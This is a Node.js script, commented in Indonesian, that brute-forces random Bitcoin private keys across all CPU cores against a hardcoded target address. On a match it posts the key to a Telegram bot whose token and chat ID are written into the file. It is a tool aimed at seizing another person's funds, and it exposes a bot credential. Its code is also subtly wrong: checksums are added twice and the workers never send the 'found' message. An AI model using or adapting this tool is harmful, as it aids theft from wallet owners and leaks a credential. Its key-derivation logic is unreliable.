import cluster from 'node:cluster';
import os from 'node:os';
import crypto from 'crypto';
import bs58check from 'bs58check';
import elliptic from 'elliptic';
import fs from 'fs';
import fetch from 'node-fetch';
import blessed from 'blessed';
import path from 'path';
import url from 'node:url';

// Mendapatkan jalur file saat ini
const __filename = url.fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Konstanta Telegram
const TELEGRAM_TOKEN = '6789484876:AAFR1OQRssKGrk8aIF0jAn0zB3eWF33XtrE';
const TELEGRAM_CHAT_ID = '-4562112556';

// Fungsi untuk mengirim pesan ke Telegram
async function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const body = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
    });

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: body
        });
        const result = await response.json();
        if (!result.ok) {
            console.error('Error sending message to Telegram:', result);
        }
    } catch (error) {
        console.error('Failed to send message to Telegram:', error);
    }
}

// Fungsi untuk mengonversi private key dari format hexadecimal ke WIF
function convertPrivateKeyToWIF(privateKeyHex) {
    const privateKeyBuffer = Buffer.from(privateKeyHex, 'hex');
    const version = 0x80;
    const keyWithPrefix = Buffer.concat([Buffer.from([version]), privateKeyBuffer]);
    const checksum = crypto.createHash('sha256').update(crypto.createHash('sha256').update(keyWithPrefix).digest()).digest().slice(0, 4);
    const keyWithChecksum = Buffer.concat([keyWithPrefix, checksum]);
    return bs58check.encode(keyWithChecksum);
}

// Fungsi untuk menghitung Bitcoin address dari private key
function getBitcoinAddressFromPrivateKey(privateKey) {
    const EC = elliptic.ec;
    const ecCurve = new EC('secp256k1');
    const keyPair = ecCurve.keyFromPrivate(privateKey, 'hex');
    const publicKey = keyPair.getPublic(true, 'hex');
    const publicKeyBuffer = Buffer.from(publicKey, 'hex');
    const publicKeyHash = crypto.createHash('sha256').update(publicKeyBuffer).digest();
    const ripemd160Hash = crypto.createHash('ripemd160').update(publicKeyHash).digest();
    const addy = Buffer.alloc(21);
    addy.writeUInt8(0x00, 0);
    ripemd160Hash.copy(addy, 1);
    const checksum = crypto.createHash('sha256').update(crypto.createHash('sha256').update(addy).digest()).digest();
    const fullAddress = Buffer.concat([addy, checksum.slice(0, 4)]);
    return bs58check.encode(fullAddress);
}

// Fungsi untuk menghasilkan private key acak
function generateRandomPrivateKey() {
    return crypto.randomBytes(32).toString('hex'); // 32 bytes untuk private key 256-bit
}

// Fungsi utama untuk melakukan pencarian private key secara acak
async function findPrivateKeyRandomly(userAddress) {
    let keysGenerated = 0;
    let startTime = Date.now();

    while (true) {
        try {
            // Menghasilkan private key acak
            const privateKey = generateRandomPrivateKey();
            // Mendapatkan Bitcoin address dari private key
            const bitcoinAddress = getBitcoinAddressFromPrivateKey(privateKey);
            const privateKeyWIF = convertPrivateKeyToWIF(privateKey);

            keysGenerated++;

            // Cek apakah address yang dihasilkan cocok dengan address target
            if (bitcoinAddress === userAddress) {
                console.log("====================================================================================");
                console.log(`Address cocok ditemukan!`);
                console.log(`[+] Private Key: ${privateKey}`);
                console.log(`[+] Private Key (WIF): ${privateKeyWIF}`);
                console.log(`[+] Bitcoin Address: ${bitcoinAddress}`);
                // fs.appendFileSync('recovered.txt', `Private Key: ${privateKey}\nPrivate Key (WIF): ${privateKeyWIF}\nAddress: ${bitcoinAddress}\n\n`);
                
                // Kirim hasil ke Telegram
                const message = `Address cocok ditemukan!\nPrivate Key: ${privateKey}\nPrivate Key (WIF): ${privateKeyWIF}\nBitcoin Address: ${bitcoinAddress}`;
                await sendTelegramMessage(message);

                return; // Hentikan jika ditemukan
            }

            // Update status ke master
            const currentTime = Date.now();
            const elapsedTime = (currentTime - startTime) / 1000; // detik
            const speed = keysGenerated / elapsedTime;
            process.send({ type: 'status', id: cluster.worker.id - 1, count: keysGenerated, speed: speed });
            
        } catch (error) {
            console.error('Error:', error);
        }
    }
}

if (cluster.isMaster) {
    // Master Process
    const numCPUs = os.cpus().length;

    // Set up blessed screen
    const screen = blessed.screen({
        smartCSR: true
    });

    // Create a box for each CPU
    const boxes = [];
    for (let i = 0; i < numCPUs; i++) {
        boxes[i] = blessed.box({
            top: i * 2,
            left: 0,
            width: '100%',
            height: 1,
            content: `CPU ${i + 1}: Total Generate: 0, Speed: 0.00/sec`,
            tags: true,
            style: {
                fg: 'white',
                bg: 'black',
                border: {
                    fg: 'blue'
                }
            }
        });
        screen.append(boxes[i]);
    }

    // Create worker processes
    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('message', (worker, message) => {
        if (message.type === 'status') {
            const { id, count, speed } = message;
            boxes[id].setContent(`CPU ${id + 1}: Total Generate: ${count}, Speed: ${speed.toFixed(2)}/sec`);
            screen.render();
        }

        if (message.type === 'found') {
            console.log("====================================================================================");
            console.log(`Address cocok ditemukan!`);
            console.log(`[+] Private Key: ${message.privateKey}`);
            console.log(`[+] Private Key (WIF): ${message.privateKeyWIF}`);
            console.log(`[+] Bitcoin Address: ${message.bitcoinAddress}`);
            fs.appendFileSync('recovered.txt', `Private Key: ${message.privateKey}\nPrivate Key (WIF): ${message.privateKeyWIF}\nAddress: ${message.bitcoinAddress}\n\n`);
            
            // Kirim hasil ke Telegram
            const msg = `Address cocok ditemukan!\nPrivate Key: ${message.privateKey}\nPrivate Key (WIF): ${message.privateKeyWIF}\nBitcoin Address: ${message.bitcoinAddress}`;
            sendTelegramMessage(msg).catch(console.error);
            
            // Kill all workers
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
        }
    });

    cluster.on('exit', (worker, code, signal) => {
        console.log(`Worker ${worker.process.pid} died`);
    });

} else {
    // Worker Process
    const userAddress = '1AC4fMwgY8j9onSbXEWeH6Zan8QGMSdmtA'; // Ganti dengan Bitcoin address target

    findPrivateKeyRandomly(userAddress).catch(console.error);
}
